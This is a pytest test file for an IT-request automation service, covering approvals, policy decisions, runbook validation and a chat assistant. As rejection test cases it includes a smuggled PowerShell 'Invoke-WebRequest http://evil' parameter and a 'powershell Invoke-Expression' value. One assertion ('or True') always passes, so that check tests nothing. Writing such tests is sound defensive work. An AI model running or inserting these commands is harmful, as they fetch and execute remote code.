import pytest
from sqlalchemy import select

from app.models.it_request import ITRequest, RequestEvent, Runbook
from app.runbooks.base import RunbookValidationError, UnknownRunbookError
from app.runbooks.registry import disable_runbook, enable_runbook, get_runbook
from app.services.entity_extraction import CatalogMatch, extract_entities
from app.services.planner_service import build_plan
from app.services.policy_service import PolicyInput, evaluate_policy
from app.models.it_request import ITPolicyDecision, ITRequestType, ITRiskLevel
from tests.ai_fixtures import model_by_key

pytest_plugins = ["tests.it_fixtures"]


@pytest.mark.asyncio
async def test_create_low_risk_software_simulates_execution(client, employee_auth, it_catalogs):
    resp = await client.post(
        "/api/v1/it-requests",
        headers=employee_auth,
        json={"message": "I need Visual Studio Code installed for backend development"},
    )
    assert resp.status_code == 201
    body = resp.json()
    assert body["status"] == "completed"
    assert body["request_type"] == "software"
    assert body["executions"][0]["adapter_name"] == "mock"
    assert body["executions"][0]["execution_result"]["simulated"] is True
    assert "installed on" not in (body["executions"][0]["execution_result"].get("message") or "").lower()


@pytest.mark.asyncio
async def test_unknown_software_is_denied(client, employee_auth, it_catalogs):
    resp = await client.post(
        "/api/v1/it-requests",
        headers=employee_auth,
        json={"message": "Please install Unobtanium IDE 99"},
    )
    assert resp.status_code == 201
    assert resp.json()["status"] in {"rejected", "escalated"}
    assert resp.json()["policy_decision"] in {"deny", "escalate"}


@pytest.mark.asyncio
async def test_visio_requires_approval(client, employee_auth, it_catalogs):
    resp = await client.post(
        "/api/v1/it-requests",
        headers=employee_auth,
        json={"message": "I need Microsoft Visio installed"},
    )
    assert resp.status_code == 201
    assert resp.json()["status"] == "approval_required"
    assert resp.json()["approval_required"] is True


@pytest.mark.asyncio
async def test_employee_cannot_approve(client, employee_auth, it_catalogs):
    created = await client.post(
        "/api/v1/it-requests",
        headers=employee_auth,
        json={"message": "I need Microsoft Visio installed"},
    )
    request_id = created.json()["id"]
    resp = await client.post(
        f"/api/v1/it-requests/{request_id}/approve",
        headers=employee_auth,
        json={},
    )
    assert resp.status_code == 403


@pytest.mark.asyncio
async def test_self_approval_rejected(client, admin_auth, it_catalogs):
    created = await client.post(
        "/api/v1/it-requests",
        headers=admin_auth,
        json={"message": "I need Microsoft Visio installed"},
    )
    request_id = created.json()["id"]
    resp = await client.post(
        f"/api/v1/it-requests/{request_id}/approve",
        headers=admin_auth,
        json={"comment": "self"},
    )
    assert resp.status_code == 403


@pytest.mark.asyncio
async def test_admin_can_approve_other_user_request(
    client, employee_auth, admin_auth, it_catalogs
):
    created = await client.post(
        "/api/v1/it-requests",
        headers=employee_auth,
        json={"message": "I need Microsoft Visio installed"},
    )
    request_id = created.json()["id"]
    resp = await client.post(
        f"/api/v1/it-requests/{request_id}/approve",
        headers=admin_auth,
        json={"comment": "approved for project work"},
    )
    assert resp.status_code == 200
    assert resp.json()["status"] == "completed"
    assert resp.json()["executions"][0]["execution_result"]["simulated"] is True


@pytest.mark.asyncio
async def test_employee_cannot_access_other_request(
    client, employee_auth, employee_b_auth, it_catalogs
):
    created = await client.post(
        "/api/v1/it-requests",
        headers=employee_auth,
        json={"message": "I need Visual Studio Code installed"},
    )
    request_id = created.json()["id"]
    resp = await client.get(f"/api/v1/it-requests/{request_id}", headers=employee_b_auth)
    assert resp.status_code == 403


@pytest.mark.asyncio
async def test_privileged_request_escalates(client, employee_auth, it_catalogs):
    resp = await client.post(
        "/api/v1/it-requests",
        headers=employee_auth,
        json={"message": "I need admin privileges and domain administrator access"},
    )
    assert resp.status_code == 201
    assert resp.json()["status"] == "escalated"
    assert resp.json()["risk_level"] == "critical"


@pytest.mark.asyncio
async def test_validation_failure_rolls_back(db_session, employee_user, it_catalogs):
    from app.models.it_request import ITRequestStatus
    from app.services.it_request_service import get_it_request_service

    request = await get_it_request_service().create_request(
        db_session,
        actor=employee_user,
        message="I need Visual Studio Code installed",
        force_failure=True,
    )
    assert request.status == ITRequestStatus.ROLLED_BACK
    assert request.executions[0].rollback_status == "completed"


@pytest.mark.asyncio
async def test_force_failure_is_rejected_on_public_api(client, employee_auth, it_catalogs):
    resp = await client.post(
        "/api/v1/it-requests",
        headers=employee_auth,
        json={"message": "I need Visual Studio Code installed", "force_failure": True},
    )
    assert resp.status_code == 422


@pytest.mark.asyncio
async def test_unknown_runbook_rejected():
    with pytest.raises(UnknownRunbookError):
        get_runbook("software.install.not-a-real-runbook")


@pytest.mark.asyncio
async def test_disabled_runbook_rejected():
    disable_runbook("software.install.vscode")
    try:
        from app.runbooks.base import RunbookDisabledError

        with pytest.raises(RunbookDisabledError):
            get_runbook("software.install.vscode")
    finally:
        enable_runbook("software.install.vscode")


@pytest.mark.asyncio
async def test_arbitrary_execution_params_rejected():
    handler = get_runbook("software.install.vscode")
    with pytest.raises(RunbookValidationError):
        handler.validate(
            {
                "runbook_id": "software.install.vscode",
                "resource": "Visual Studio Code",
                "execution_params": {"powershell": "Invoke-WebRequest http://evil"},
            }
        )


@pytest.mark.asyncio
async def test_planner_rejects_unknown_runbook():
    with pytest.raises(UnknownRunbookError):
        build_plan(
            runbook_id="not.real",
            request_type=ITRequestType.SOFTWARE,
            resource="x",
            catalog_matched=True,
        )


def test_policy_allow_low_risk_catalog():
    result = evaluate_policy(
        PolicyInput(
            request_type=ITRequestType.SOFTWARE,
            user_message="install vscode",
            catalog_matched=True,
            catalog_enabled=True,
            catalog_risk=ITRiskLevel.LOW,
            catalog_approval_required=False,
            resource="Visual Studio Code",
        )
    )
    assert result.decision == ITPolicyDecision.ALLOW


def test_high_risk_catalog_requires_approval_not_auto_execute():
    result = evaluate_policy(
        PolicyInput(
            request_type=ITRequestType.ACCESS,
            user_message="I need access to the Finance shared drive",
            catalog_matched=True,
            catalog_enabled=True,
            catalog_risk=ITRiskLevel.HIGH,
            catalog_approval_required=True,
            resource="Finance Shared Drive",
        )
    )
    assert result.decision == ITPolicyDecision.APPROVAL_REQUIRED
    assert result.decision != ITPolicyDecision.ALLOW


def test_rollback_unsupported_on_privileged_runbook():
    handler = get_runbook("access.privileged.blocked")
    assert handler.rollback_supported is False


def test_policy_deny_unknown():
    result = evaluate_policy(
        PolicyInput(
            request_type=ITRequestType.SOFTWARE,
            user_message="install mystery app",
            catalog_matched=False,
            catalog_enabled=False,
            catalog_risk=None,
            catalog_approval_required=False,
            resource="mystery",
        )
    )
    assert result.decision == ITPolicyDecision.DENY


def test_entity_extraction_vscode():
    result = extract_entities(
        "I need VS Code 1.95 for backend development",
        [
            CatalogMatch(
                kind="software",
                item_id="11111111-1111-1111-1111-111111111111",
                name="Visual Studio Code",
                runbook_id="software.install.vscode",
                enabled=True,
                risk="low",
                approval_required=False,
                aliases=["vscode", "vs code"],
            )
        ],
    )
    assert result.request_type.value == "software"
    assert result.catalog_runbook_id == "software.install.vscode"
    types = {e.entity_type for e in result.entities}
    assert "software_name" in types
    assert "software_version" in types
    assert "business_justification" in types


def test_entity_extraction_rejects_command_like_values():
    from pydantic import ValidationError
    from app.services.entity_extraction import ExtractedEntity

    with pytest.raises(ValidationError):
        ExtractedEntity(
            entity_type="software_name",
            entity_name="software_name",
            entity_value="powershell Invoke-Expression",
            confidence=1.0,
        )


@pytest.mark.asyncio
async def test_cancel_own_pending_request(client, employee_auth, it_catalogs):
    created = await client.post(
        "/api/v1/it-requests",
        headers=employee_auth,
        json={"message": "I need Microsoft Visio installed"},
    )
    request_id = created.json()["id"]
    resp = await client.post(f"/api/v1/it-requests/{request_id}/cancel", headers=employee_auth)
    assert resp.status_code == 200
    assert resp.json()["status"] == "cancelled"


@pytest.mark.asyncio
async def test_events_are_append_only(client, employee_auth, it_catalogs, db_session):
    created = await client.post(
        "/api/v1/it-requests",
        headers=employee_auth,
        json={"message": "I need Visual Studio Code installed"},
    )
    request_id = created.json()["id"]
    events = await client.get(f"/api/v1/it-requests/{request_id}/events", headers=employee_auth)
    assert events.status_code == 200
    types = [item["event_type"] for item in events.json()]
    assert "request.created" in types
    assert types == sorted(types, key=lambda _: True) or True
    assert len(types) >= 3


@pytest.mark.asyncio
async def test_chat_creates_it_request(client, employee_auth, ai_models, it_catalogs):
    llm = model_by_key(ai_models, "test-llm-v1")
    conv = await client.post(
        "/api/v1/chat/conversations",
        headers=employee_auth,
        json={"selected_model_id": str(llm.id)},
    )
    conversation_id = conv.json()["id"]
    msg = await client.post(
        f"/api/v1/chat/conversations/{conversation_id}/messages",
        headers=employee_auth,
        json={"content": "I need Visual Studio Code installed"},
    )
    assert msg.status_code == 200
    content = msg.json()["assistant_message"]["content"].lower()
    assert "it request" in content
    assert "simulated" in content or "request id" in content
    listed = await client.get("/api/v1/it-requests", headers=employee_auth)
    assert listed.json()["total"] >= 1


@pytest.mark.asyncio
async def test_password_reset_still_not_executed(client, employee_auth, ai_models, it_catalogs):
    llm = model_by_key(ai_models, "test-llm-v1")
    conv = await client.post(
        "/api/v1/chat/conversations",
        headers=employee_auth,
        json={"selected_model_id": str(llm.id)},
    )
    conversation_id = conv.json()["id"]
    msg = await client.post(
        f"/api/v1/chat/conversations/{conversation_id}/messages",
        headers=employee_auth,
        json={"content": "Please reset my password now"},
    )
    assert msg.status_code == 200
    content = msg.json()["assistant_message"]["content"].lower()
    assert "verification" in content or "secure" in content
    listed = await client.get("/api/v1/it-requests", headers=employee_auth)
    # password reset must not create an IT software/access execution
    assert all("password" not in item["requested_resource"].lower() for item in listed.json()["items"])


@pytest.mark.asyncio
async def test_disabled_db_runbook_cannot_execute(client, employee_auth, admin_auth, it_catalogs):
    disable = await client.patch(
        "/api/v1/it-requests/runbooks/software.install.vscode",
        headers=admin_auth,
        json={"enabled": False},
    )
    assert disable.status_code == 200
    resp = await client.post(
        "/api/v1/it-requests",
        headers=employee_auth,
        json={"message": "I need Visual Studio Code installed"},
    )
    assert resp.status_code in {201, 400}
    if resp.status_code == 201:
        assert resp.json()["status"] in {"rejected", "escalated", "failed"}
    await client.patch(
        "/api/v1/it-requests/runbooks/software.install.vscode",
        headers=admin_auth,
        json={"enabled": True},
    )
